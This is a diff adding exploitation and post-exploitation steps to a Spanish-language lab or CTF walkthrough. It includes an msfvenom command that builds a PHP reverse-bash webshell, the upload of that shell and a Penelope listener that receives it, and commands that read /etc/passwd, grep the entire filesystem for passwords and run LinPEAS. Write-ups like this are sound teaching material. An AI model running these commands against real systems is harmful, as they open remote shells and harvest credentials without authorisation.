@@ -57,8 +57,35 @@ Ahora, teniendo en cuenta esto, pasamos a crear la webshell con msfvemom:
 
 `msfvenom -p php/unix/cmd/reverse_bash LHOST=<IP_local> LPORT=<puerto_local> R -o webshell.php.phar`  
 
-> Usamos dicho payload para poder recibir la conexión con alguna otra herramienta alternativa a Meterpreter para variar.  
+> Usamos dicho payload para poder recibir la conexión con alguna otra herramienta alternativa a Meterpreter para variar.
+
+Bien, una vez, creada nuestra WebShell, procedemos a subirla, tenemos éxito y nos dirigimos a /`uploads` donde verificamos la subida. Una vez confirmada, pasamos a preparar nuestro listener. En este caso, usamos Penélope (https://github.com/brightio/penelope). Con `penelope -i <IP_local> -p <puerto>` creamos nuestro listener. Corremos y ejecutamos la webshell remota. Tenemos acceso.  
 
 ___
 
-#### FASE POST-EXPLOTACIÓN
+#### FASE POST-EXPLOTACIÓN  
+
+Con un pie dentro, corremos `whoami` y verificamos que somos `www-data`.  
+
+Lo primero que debemos hacer apenas entramos es Enumerar Usuarios. Lo hacemos de la siguiente manera:  
+
+* `cat /etc/passwd`
+* `ls -l /home`
+
+Ahora podemos comprobar que los usuarios son 4:  
+
+1. fernando
+2. mario
+3. julen
+4. iker
+
+Lo segundo es Buscar Credenciales en el sistema. Podemos hacerlo con:  
+
+* `grep -RIin password / 2>/dev/null`
+* `find / -type f -iname "password" 2>/dev/null | xargs ls -l`
+
+> También podemos correr LinPEAS desde Penélope haciendo:
+> `modules` ==> `run peass_ng`
+
+
+
